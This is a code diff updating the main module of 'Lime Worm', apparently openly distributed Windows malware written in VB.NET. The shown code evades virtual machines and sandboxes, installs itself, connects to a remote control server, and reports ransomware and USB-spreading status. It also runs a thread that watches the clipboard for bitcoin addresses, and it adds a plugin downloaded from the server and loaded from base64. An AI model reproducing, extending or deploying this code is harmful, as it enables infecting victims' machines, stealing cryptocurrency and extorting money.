@@ -1,6 +1,6 @@
 ﻿
 '##################################################################
-'##        N Y A N   C A T  |||   Updated on May./01/2018        ##
+'##        N Y A N   C A T  |||   Updated on May./04/2018        ##
 '##################################################################
 '##                                                              ##
 '##                                                              ##
@@ -19,7 +19,7 @@
 '##            ░░░░░░████▀░░███▀░░░░░░▀███░░▀██▀░░░░░░           ##
 '##            ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░           ##
 '##                                                              ##
-'##                     .. Lime Worm v0.5.5 ..                   ##
+'##                     .. Lime Worm v0.5.6 ..                   ##
 '##                                                              ##
 '##                                                              ##
 '##                                                              ##
@@ -43,7 +43,6 @@ Public Class Main
     Public Shared Sub Main()
 
         Thread.Sleep(1000)
-
         Dim createdNew As Boolean 'Making sure that only 1 process is running
         Settings.NMT = New Mutex(True, Settings.MTX, createdNew)
         Try
@@ -55,15 +54,12 @@ Public Class Main
         End Try
 
         If Settings.ANTI Then
-            Call VMware()
-            Call Virtualbox()
-            Call Sandboxie()
-            Call Win_XP()
+            Call Anti()
         End If
 
         Call Installation.INS()
 
-        TCP.CON() 'Start TCP connection to server
+        TCP.T1.Start() 'Start TCP connection to server
 
         If Settings.BTC_ADDR.Length > 25 Then
             Dim _BTC As Thread = New Thread(AddressOf _BTC_ST)
@@ -76,10 +72,17 @@ Public Class Main
             _USB.Start()
         End If
 
+        If Settings.PIN Then
+            Dim _PIN As Thread = New Thread(AddressOf StartPIN)
+            _PIN.Start()
+        End If
+
         Dim CHK As Thread = New Thread(AddressOf Checking)
         CHK.Start()
 
     End Sub
+
+#Region "Loops"
 
     Private Shared Sub Checking()
         Thread.CurrentThread.Sleep(5000)
@@ -88,33 +91,36 @@ Public Class Main
 
 1:
         Try
-
             While True
-                'Compare old string with new string
-
-                If Old <> GTV("Ransome-Status").ToString Then
-                    Old = GTV("Ransome-Status")
-                    C.Send("!R" & SPL & GTV("Ransome-Status").ToString)
-                End If
-
-                If Settings.USB Then
-                    If Old2 <> GTV("USB").ToString Then
-                        Old2 = GTV("USB")
-                        C.Send("!U" & SPL & GTV("USB").ToString)
+                If C.CNT = True Then
+                    Thread.CurrentThread.Sleep(3000)
+                    'Compare old string with new string            
+                    If Old <> GTV("Ransome-Status").ToString Then
+                        Old = GTV("Ransome-Status")
+                        C.Send("!R" & SPL & GTV("Ransome-Status").ToString)
                     End If
+
+                    If Settings.USB Then
+                        If Old2 <> GTV("USB").ToString Then
+                            Old2 = GTV("USB")
+                            C.Send("!U" & SPL & GTV("USB").ToString)
+                        End If
+                    End If
+                Else
+                    Thread.CurrentThread.Sleep(5000)
                 End If
-                Thread.CurrentThread.Sleep(3000)
             End While
         Catch ex As Exception
             GoTo 1
         End Try
+
     End Sub
 
     Private Shared Sub _BTC_ST()
         While True
             Try
 
-                Thread.CurrentThread.Sleep(1500)
+                Thread.CurrentThread.Sleep(7000)
 
                 'check if clipboard contains bitcoin address, the address always starts with 1 or 3 or bc1
                 'the length is between 26-35 characters
@@ -131,11 +137,10 @@ Public Class Main
     End Sub
 
     Private Shared Sub StartSP()
-
         If GTV("_USB") = Nothing Then
             While True
-                Thread.CurrentThread.Sleep(5000)
                 If C.CNT = True Then
+                    Thread.CurrentThread.Sleep(9000)
                     C.Send("PLUSB")
                     Exit While
                 End If
@@ -144,8 +149,24 @@ Public Class Main
         Else
             Commands.Plugin(Convert.FromBase64String(GTV("_USB")))
         End If
-
     End Sub
+
+    Private Shared Sub StartPIN()
+        If GTV("_PIN") = Nothing Then
+            While True
+                If C.CNT = True Then
+                    Thread.CurrentThread.Sleep(11000)
+                    C.Send("PLPIN")
+                    Exit While
+                End If
+            End While
+
+        Else
+            Commands.Plugin(Convert.FromBase64String(GTV("_PIN")))
+        End If
+    End Sub
+
+#End Region
 
 End Class
 
